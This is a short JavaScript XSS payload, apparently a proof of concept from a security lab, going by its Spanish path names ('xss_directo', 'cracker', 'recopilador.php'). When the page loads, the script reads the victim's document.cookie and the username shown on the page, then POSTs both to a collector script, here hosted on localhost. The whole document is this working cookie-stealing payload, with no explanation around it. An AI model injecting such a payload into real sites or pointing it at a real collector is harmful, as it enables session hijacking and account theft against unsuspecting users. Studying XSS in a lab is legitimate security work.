<script languague="javascript">
$(document).ready(function(){
	var cookie = document.cookie;
	var usuario = $("#nombre_usuario").html().trim();
	$.ajax({
		type:"post",
		url:"http://localhost/LabSis/poc/xss_directo/cracker/recopilador.php",
		data:{
			"cookie":cookie,
			"usuario":usuario
			}
		});
});
</script>
